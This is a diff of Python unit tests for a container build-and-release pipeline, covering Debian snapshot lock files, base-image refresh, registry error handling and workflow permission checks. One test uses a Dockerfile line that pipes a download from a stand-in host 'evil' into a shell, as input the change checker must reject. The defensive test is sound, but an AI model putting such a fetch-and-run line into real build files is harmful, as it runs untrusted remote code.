@@ -99,10 +99,12 @@ class LockFileTests(unittest.TestCase):
         self.assertTrue(out.rstrip().endswith("# Further sub-dependencies (added by scripts/lock.py)\nblinker==1.9.0"))
 
     def test_os_lock_roundtrip(self):
-        text = lock.render_os_lock("20261026T041700Z", "13 trixie", {"zlib1g": "1:1.3", "bash": "5.2", "Z": "1"})
-        snap, pkgs, debian = lock.read_os_lock(text)
-        self.assertEqual((snap, debian), ("20261026T041700Z", "13 trixie"))
-        self.assertEqual(pkgs, {"zlib1g": "1:1.3", "bash": "5.2", "Z": "1"})
+        text = lock.render_os_lock("20261026T021503Z", "20261026T031000Z", "13 trixie", "amd64",
+                                   {"zlib1g": "1:1.3", "bash": "5.2", "Z": "1"})
+        st = lock.read_os_lock(text)
+        self.assertEqual((st["snapshot"], st["security"], st["debian"], st["arch"]),
+                         ("20261026T021503Z", "20261026T031000Z", "13 trixie", "amd64"))
+        self.assertEqual(st["packages"], {"zlib1g": "1:1.3", "bash": "5.2", "Z": "1"})
         body = [l.split()[0] for l in text.splitlines() if not l.startswith("#")]
         self.assertEqual(body, ["Z", "bash", "zlib1g"])                          # like LC_ALL=C sort
 
@@ -119,21 +121,22 @@ class RefreshTests(unittest.TestCase):
         (self.tmp / "Dockerfile").write_text(
             f"ARG PYTHON_IMAGE=python:3.13.16-slim-trixie@sha256:{DIGEST_A}\nFROM ${{PYTHON_IMAGE}}\n"
             "ARG PIP_VERSION=26.2.2\n")
-        (self.tmp / lock.OS_LOCK).write_text(
-            lock.render_os_lock("20261019T000000Z", "13 trixie", {"bash": "5.2.37-2", "libssl3t64": "3.5.1-1"}))
+        (self.tmp / lock.OS_LOCK).write_text(lock.render_os_lock(
+            "20261019T000000Z", "20261019T010000Z", "13 trixie", "amd64", {"bash": "5.2.37-2", "libssl3t64": "3.5.1-1"}))
         (self.tmp / "requirements.txt").write_text("# on Python 3.13.16.\nFlask==3.1.3\ncertifi==2026.10.19\n")
         (self.tmp / "requirements.in").write_text("Flask>=3.1,<4\n")
-        self.result = {"python": "3.13.16", "pip": "26.2.2", "debian": "13 trixie",
+        self.result = {"python": "3.13.16", "pip": "26.2.2", "debian": "13 trixie", "arch": "amd64",
                        "packages": {"bash": "5.2.37-2", "libssl3t64": "3.5.1-1"},
                        "pins": {"flask": ("Flask", "3.1.3"), "certifi": ("certifi", "2026.10.19")}}
         self.patch = 16
         self.calls = []
-        orig = (lock.hub_tags, lock.digest_of, lock.resolve)
-        self.addCleanup(lambda: setattr(lock, "hub_tags", orig[0]) or setattr(lock, "digest_of", orig[1])
-                        or setattr(lock, "resolve", orig[2]))
+        for name in ("hub_tags", "digest_of", "resolve", "latest_snapshots"):
+            self.addCleanup(setattr, lock, name, getattr(lock, name))
         lock.hub_tags = lambda major, minor: [f"{major}.{minor}.{self.patch}-slim-trixie"]
         lock.digest_of = lambda ref: DIGEST_B                      # the registry always has a new digest
-        lock.resolve = lambda image, snap, state, root: self.calls.append((image, snap)) or json.loads(json.dumps(self.result))
+        lock.latest_snapshots = lambda: ("20261026T021503Z", "20261026T031000Z")   # completed imports
+        lock.resolve = lambda image, snap, sec, state, root: (self.calls.append((image, snap, sec))
+                                                               or json.loads(json.dumps(self.result)))
 
     def files(self):
         return {p: (self.tmp / p).read_text() for p in ("Dockerfile", lock.OS_LOCK, "requirements.txt")}
@@ -150,8 +153,8 @@ class RefreshTests(unittest.TestCase):
         changes = lock.refresh(self.tmp)
         self.assertEqual([(c["name"], c["old"], c["new"]) for c in changes],
                          [("libssl3t64", "3.5.1-1", "3.5.1-1+deb13u1"), ("newpkg", None, "1")])
-        snap, pkgs, _ = lock.read_os_lock((self.tmp / lock.OS_LOCK).read_text())
-        self.assertEqual(snap, self.calls[0][1])
+        st = lock.read_os_lock((self.tmp / lock.OS_LOCK).read_text())
+        self.assertEqual((st["snapshot"], st["security"]), ("20261026T021503Z", "20261026T031000Z"))
         self.assertIn(f"python:3.13.16-slim-trixie@sha256:{DIGEST_B}", (self.tmp / "Dockerfile").read_text())
 
     def test_new_python_patch_and_packages(self):
@@ -181,6 +184,16 @@ class RefreshTests(unittest.TestCase):
                 self.assertEqual(self.files(), before)
                 self.result = saved
 
+    def test_compare_with_published_state(self):
+        old = lock.read_state(self.tmp)
+        self.patch = 17
+        self.result.update(python="3.13.17")
+        self.result["packages"] = {"bash": "5.2.37-2", "libssl3t64": "3.5.1-1+deb13u1"}
+        lock.refresh(self.tmp)
+        changes = lock.compare(old, lock.read_state(self.tmp))
+        self.assertEqual({(c["kind"], c["name"]) for c in changes}, {("base", "python"), ("debian", "libssl3t64")})
+        self.assertEqual(lock.compare(old, old), [])
+
     def test_constraints_passed_to_the_resolver(self):
         state = lock.read_state(self.tmp)
         lines = sorted(lock.constraint(n, v) for n, v in state["pins"].values())
@@ -202,10 +215,13 @@ class DockerfileTests(unittest.TestCase):
         self.assertIn("RUN sh /tmp/build/os-install.sh", self.df)
         snap = (ROOT / "build" / "apt-snapshot.sh").read_text()
         self.assertIn("https://snapshot.debian.org/archive/debian/${ts}", snap)
-        self.assertIn("https://snapshot.debian.org/archive/debian-security/${ts}", snap)
+        self.assertIn("https://snapshot.debian.org/archive/debian-security/${sec}", snap)
         self.assertIn("full-upgrade", snap)                                   # also the base image's packages
         inst = (ROOT / "build" / "os-install.sh").read_text()
         self.assertIn("diff -u /tmp/locked-packages /tmp/installed-packages", inst)
+        self.assertIn('sh "$dir/apt-snapshot.sh" "$ts" "$sec"', inst)
+        self.assertIn("dpkg --print-architecture", inst)                    # list compared on its own CPU type
+        self.assertIn("mr/timestamp", (ROOT / "scripts" / "lock.py").read_text())   # only completed imports
 
     def test_python_packages_exact_and_no_package_manager_left(self):
         self.assertIn("pip install --no-deps --only-binary=:all: -r requirements.txt", self.df)
@@ -276,6 +292,66 @@ class VersionPlanTests(unittest.TestCase):
         self.assertEqual(p["tags"], [f"{self.IMG}:1.9.5-s3", f"{self.IMG}:1.9", f"{self.IMG}:latest"])
         with self.assertRaises(SystemExit):                         # only for the highest version
             ci.plan_security(self.IMG, "1.9.4", ["v1.9.4", "v1.9.5"], [])
+
+    def test_repair_after_a_run_that_stopped_halfway(self):
+        I = self.IMG
+        digests = {f"{I}:1.9.5": "d5", f"{I}:1.9.5-s2": "s2", f"{I}:1.9": "s2", f"{I}:latest": "d5"}
+        builds = {"d5": "1.9.5", "s2": "1.9.5-s2", "x": None, "new": "1.9.5-s9"}
+        tags = ["v1.9.4", "v1.9.5", "v1.9.5-s1", "v1.9.5-s2"]
+        build_of = lambda ref: builds[digests[ref]]
+        self.assertEqual(ci.expected_build("1.9.5", tags), "1.9.5-s2")
+        self.assertEqual(ci.expected_build("1.9.6", tags), "1.9.6")
+        r = ci.plan_repair(I, "1.9.5", tags, digests.get, build_of)
+        self.assertEqual(r, {"source": f"{I}:1.9.5-s2", "tags": [f"{I}:latest"]})        # latest still on 1.9.5
+        digests[f"{I}:latest"] = "s2"
+        self.assertEqual(ci.plan_repair(I, "1.9.5", tags, digests.get, build_of)["tags"], [])
+        digests[f"{I}:latest"] = "x"                       # an image without our label (e.g. an older pipeline)
+        self.assertEqual(ci.plan_repair(I, "1.9.5", tags, digests.get, build_of)["tags"], [])
+        digests[f"{I}:latest"] = "new"                     # never backwards
+        self.assertEqual(ci.plan_repair(I, "1.9.5", tags, digests.get, build_of)["tags"], [])
+        self.assertEqual(ci.plan_repair(I, "1.9.6", tags, digests.get, build_of)["tags"], [])   # not published yet
+        self.assertLess(ci.build_key("1.9.5"), ci.build_key("1.9.5-s1"))
+        self.assertLess(ci.build_key("1.9.5-s9"), ci.build_key("1.10.0"))
+
+    def test_automatic_updates_change_only_lock_files(self):
+        ok_df = "--- a/Dockerfile\n+++ b/Dockerfile\n@@ -4 +4 @@\n-ARG PYTHON_IMAGE=python:3.13.16-slim-trixie@x\n+ARG PYTHON_IMAGE=python:3.13.17-slim-trixie@y\n"
+        self.assertEqual(ci.check_changes(["requirements.txt", "build/debian-packages.lock", "CHANGELOG.md",
+                                           "Dockerfile"], ok_df), [])
+        self.assertTrue(ci.check_changes(["update.sh"], ""))
+        self.assertTrue(ci.check_changes(["scripts/lock.py"], ""))
+        self.assertTrue(ci.check_changes(["Dockerfile"], "+RUN curl evil | sh\n"))
+
+    def test_registry_errors_never_mean_missing(self):
+        import io
+        import urllib.error
+        from unittest import mock
+
+        class Answer(io.BytesIO):
+            def __init__(self, body=b"{}", headers=None):
+                super().__init__(body)
+                self.headers = headers or {}
+
+        def urlopen(req, timeout=0):
+            url = req.full_url if hasattr(req, "full_url") else req
+            if "/token" in url:
+                return Answer(b'{"token": "t"}')
+            if url.endswith("/manifests/there"):
+                return Answer(headers={"Docker-Content-Digest": "sha256:" + "c" * 64})
+            if url.endswith("/manifests/gone"):
+                raise urllib.error.HTTPError(url, 404, "no", {}, None)
+            if "/tags/list" in url and "last=" not in url:
+                return Answer(b'{"tags": ["1.9.5", "1.9.5-s1"]}', {"Link": '</v2/o/r/tags/list?n=1000&last=1.9.5-s1>; rel="next"'})
+            if "/tags/list" in url:
+                return Answer(b'{"tags": ["latest"]}')
+            raise urllib.error.HTTPError(url, 503, "busy", {}, None)
+
+        with mock.patch("urllib.request.urlopen", urlopen):
+            reg = ci.Registry("o/r", "u", "p")
+            self.assertTrue(reg.digest("there").startswith("sha256:"))
+            self.assertIsNone(reg.digest("gone"))
+            with self.assertRaises(SystemExit):
+                reg.digest("busy")                                # 503: stop, never "missing"
+            self.assertEqual(reg.tags(), ["1.9.5", "1.9.5-s1", "latest"])   # follows the pages
 
     def test_changelog_entry(self):
         changes = [{"kind": "base", "name": "python", "old": "3.13.16", "new": "3.13.17"},
@@ -373,6 +449,7 @@ class TrivyFlowTests(unittest.TestCase):
         return subprocess.run(["bash", str(self.tmp / ".github/trivy-scan.sh"), "image.tar", "Test"],
                               cwd=self.tmp, env=e, capture_output=True, text=True)
 
+    @unittest.skipUnless(shutil.which("jq"), "needs jq (on the GitHub runner)")
     def test_no_findings_passes(self):
         r = self.scan()
         self.assertEqual(r.returncode, 0, r.stdout + r.stderr)
@@ -382,6 +459,7 @@ class TrivyFlowTests(unittest.TestCase):
             self.assertIn(flag, args)
         self.assertIn("No HIGH/CRITICAL findings", (self.tmp / "summary.md").read_text())
 
+    @unittest.skipUnless(shutil.which("jq"), "needs jq (on the GitHub runner)")
     def test_finding_stops_with_readable_cause(self):
         r = self.scan(FAKE_FINDING="1", CONSEQUENCE="nothing is published")
         self.assertEqual(r.returncode, 1)
@@ -422,8 +500,10 @@ class WorkflowTests(unittest.TestCase):
     J = jobs()
 
     def test_jobs(self):
-        self.assertEqual(list(self.J), ["mode", "build", "test", "scan", "publish", "relock", "relock-commit",
-                                        "scan-latest", "eol"])
+        self.assertEqual(list(self.J), ["mode", "build", "test", "scan", "publish", "repair", "relock",
+                                        "relock-commit", "scan-latest", "eol"])
+        for name, text in self.J.items():
+            self.assertRegex(text, r"\n    timeout-minutes: \d+\n", name)
 
     def test_triggers_only_main_branch(self):
         on = WF.split("\non:\n", 1)[1].split("\npermissions:", 1)[0]
@@ -436,10 +516,12 @@ class WorkflowTests(unittest.TestCase):
         for name, text in self.J.items():
             perms = job_permissions(text)
             self.assertIsNotNone(perms, f"{name}: no permissions block")
-            if name in ("publish", "relock-commit"):
-                self.assertIn("contents: write", perms)
+            if name in ("publish", "relock-commit", "repair"):
+                self.assertIn("write", perms)
+                self.assertIn("    environment: release\n", text, name)      # restricted to master in the settings
             else:
                 self.assertNotIn("write", perms, name)
+                self.assertNotIn("environment:", text, name)
 
     def test_pinned_actions_and_no_trivy_action(self):
         for ref in re.findall(r"uses:\s*(\S+)", WF):
@@ -473,20 +555,34 @@ class WorkflowTests(unittest.TestCase):
 
     def test_never_overwrite_and_latest_last(self):
         pub = self.J["publish"]
-        check = pub.index('if docker buildx imagetools inspect "$first"')
+        check = pub.index('python3 scripts/ci.py registry-digest')
         self.assertLess(check, pub.index('docker push -q "$first"'))
+        self.assertIn('if [ "$state" != missing ]', pub)                     # fails closed
+        self.assertNotIn("imagetools inspect", WF)                            # its errors would look like "missing"
+        self.assertLess(pub.index("check-changes"), pub.index("docker/login-action"))
         self.assertLess(pub.index("git apply"), pub.index('for t in "${tags[@]:1}"'))
+        release = pub[pub.index('if [ "$KIND" = release ]'):pub.index("          else\n")]
+        self.assertLess(release.index("git tag"), release.index("docker push"))   # tag first: a re-run resumes
         self.assertIn("push --atomic origin HEAD:refs/heads/master", pub)
         self.assertIn('http.https://github.com/.extraheader="$auth"', pub)
-        self.assertIn('docker buildx imagetools inspect "${image}:${version}"', self.J["build"])   # release: once
+        self.assertIn("check-changes", self.J["relock-commit"])
+        self.assertIn('[ "$VERSION_EXISTS" = true ]', self.J["build"])
+        self.assertIn("points to another commit", self.J["build"])
 
     def test_security_update_flow(self):
         b = self.J["build"]
         refresh = b.index("python3 scripts/lock.py refresh")
         self.assertLess(b.index("unreleased program changes"), refresh)
-        self.assertLess(refresh, b.index("git diff --quiet"))
+        self.assertLess(refresh, b.index('lock.py changes --since "$published"'))   # against what is published
         self.assertLess(b.index("plan-security"), b.index("ci.py changelog"))
-        self.assertIn("No new versions within the base – nothing to do.", b)
+        self.assertIn("nothing to do.", b)
+        prep = b[b.index("- name: Prepare"):b.index("- name: Build")]
+        self.assertNotIn("GH_TOKEN", prep)                     # no token while third-party containers run
+
+    def test_selftests_on_runner_others_in_image(self):
+        t = self.J["test"]
+        self.assertIn("python3 -m pytest -q -p no:cacheprovider -rfE tests/test_supply_chain.py", t)
+        self.assertIn("--ignore=tests/test_supply_chain.py tests", t)
 
     def test_one_release_at_a_time(self):
         self.assertIn("'docker-release'", WF)
